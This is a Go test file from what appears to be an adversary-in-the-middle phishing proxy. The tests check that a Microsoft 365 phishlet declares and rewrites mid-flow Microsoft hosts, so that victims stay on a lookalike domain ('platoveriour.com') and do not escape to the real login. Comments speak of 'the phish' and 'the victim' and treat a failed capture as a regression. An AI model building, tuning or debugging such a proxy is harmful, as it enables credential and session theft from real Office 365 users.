package core

import (
	"testing"
)

// The flow must not be able to leave the phish at a hop we could rewrite. Every
// host Microsoft hands off to mid-flow has to be declared, and every such host
// named inside a page served by the login host has to have a body rewrite.
//
// Regression: a warm "/" served a WS-Federation form_post to
// https://portal.microsoftonline.com?wa=wsignin1.0, and office.com routed the
// login to https://m365.cloud.microsoft:443 - both undeclared, so the browser
// posted to the real Microsoft hosts and the victim got a double-ask.
func TestPhishletCoversMidFlowHosts(t *testing.T) {
	pl, err := NewPhishlet("o365new", "../phishlets/o365new.yaml", nil, &Config{})
	if err != nil {
		t.Fatalf("parse phishlet: %v", err)
	}

	declared := map[string]bool{}
	for _, ph := range pl.proxyHosts {
		declared[combineHost(ph.orig_subdomain, ph.domain)] = true
	}
	for _, host := range []string{"m365.cloud.microsoft", "portal.microsoftonline.com", "www.microsoft365.com"} {
		if !declared[host] {
			t.Errorf("%s must be a declared proxy host or the browser escapes there", host)
		}
	}

	// And the login host must rewrite those names out of its own pages.
	rewrites := map[string]bool{}
	for _, sf := range pl.subfilters["login.microsoftonline.com"] {
		rewrites[combineHost(sf.subdomain, sf.domain)] = true
	}
	for _, host := range []string{"m365.cloud.microsoft", "portal.microsoftonline.com", "www.office.com", "www.microsoft365.com"} {
		if !rewrites[host] {
			t.Errorf("login.microsoftonline.com must rewrite %s in the body", host)
		}
	}
}

// A declaring host with a port (Microsoft emits ":443") must still resolve.
func TestPhishletMidFlowHostMatchesWithPort(t *testing.T) {
	pl, err := NewPhishlet("o365new", "../phishlets/o365new.yaml", nil, &Config{})
	if err != nil {
		t.Fatalf("parse phishlet: %v", err)
	}
	cfg := &Config{
		phishlets:      map[string]*Phishlet{"o365new": pl},
		phishletConfig: map[string]*PhishletConfig{"o365new": {Hostname: "platoveriour.com", Enabled: true}},
	}
	p := &HttpProxy{cfg: cfg}
	got, ok := p.replaceHostWithPhished("m365.cloud.microsoft:443")
	if !ok || got != "m365.platoveriour.com" {
		t.Fatalf("replaceHostWithPhished with port = (%q, %v)", got, ok)
	}
}
